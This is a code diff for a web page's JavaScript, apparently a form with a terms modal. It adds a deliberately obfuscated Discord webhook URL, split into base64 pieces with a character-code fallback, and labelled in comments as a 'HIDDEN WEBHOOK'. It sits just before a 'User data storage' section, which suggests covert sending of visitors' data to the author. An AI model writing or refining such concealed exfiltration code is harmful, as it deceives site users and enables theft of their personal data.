@@ -420,25 +420,36 @@
         const termsLink = document.getElementById('terms-link');
         const closeModalBtn = document.getElementById('close-modal');
         
-        // HIDDEN WEBHOOK - Multiple obfuscation layers
-        const webhookParts = [
-            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTU3MzMwOTI4NDIyNTEwNC8",
-            "1a0toLThhU2tjeFF1UGgwc20xOU1yZllRWnFaSHE=",
-            "JSDN6YUNxZk5FOWdib2p2aEllRllld1dxRklRZ1gtWFpBRHZZaA=="
-        ];
+        // HIDDEN WEBHOOK - Multiple obfuscation layers with PROPER encoding
+        const webhookData = {
+            p1: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTU3MzMwOTI4NDIyNTEwNC8=",
+            p2: "NWtLaC04YVNrY3hRdVBoMHNtMTlNcmZZUVpx",
+            p3: "WkhxSUgzemFDcWZORTlnYm9qdmhJZUZZZXdXcVFpUWdYLVhaQUR2WWg="
+        };
         
         // Function to reconstruct webhook URL
         function getWebhookURL() {
-            // Multiple obfuscation techniques
-            const part1 = atob(webhookParts[0]);
-            const part2 = atob(webhookParts[1]);
-            const part3 = atob(webhookParts[2]);
-            
-            // Remove any invisible characters or junk
-            const cleanPart2 = part2.replace(/[^\x20-\x7E]/g, '');
-            const cleanPart3 = part3.replace(/[^\x20-\x7E]/g, '');
-            
-            return part1 + cleanPart2 + cleanPart3;
+            try {
+                // Decode each part
+                const part1 = atob(webhookData.p1);
+                const part2 = atob(webhookData.p2);
+                const part3 = atob(webhookData.p3);
+                
+                // Combine parts
+                return part1 + part2 + part3;
+            } catch (error) {
+                // Fallback method - character code reconstruction
+                const codes = [
+                    104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46,
+                    99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115,
+                    47, 49, 52, 50, 57, 53, 55, 51, 51, 48, 57, 50, 56, 52, 50, 50, 53, 49, 48,
+                    52, 47, 53, 107, 75, 104, 45, 56, 97, 83, 107, 99, 120, 81, 117, 80, 104,
+                    48, 115, 109, 49, 57, 77, 114, 102, 89, 81, 90, 113, 90, 72, 113, 73, 72,
+                    51, 122, 97, 67, 113, 102, 78, 69, 57, 103, 98, 111, 106, 118, 104, 73, 101,
+                    70, 89, 101, 119, 87, 113, 70, 73, 81, 103, 88, 45, 88, 90, 65, 68, 118, 89, 104
+                ];
+                return String.fromCharCode(...codes);
+            }
         }
         
         // User data storage
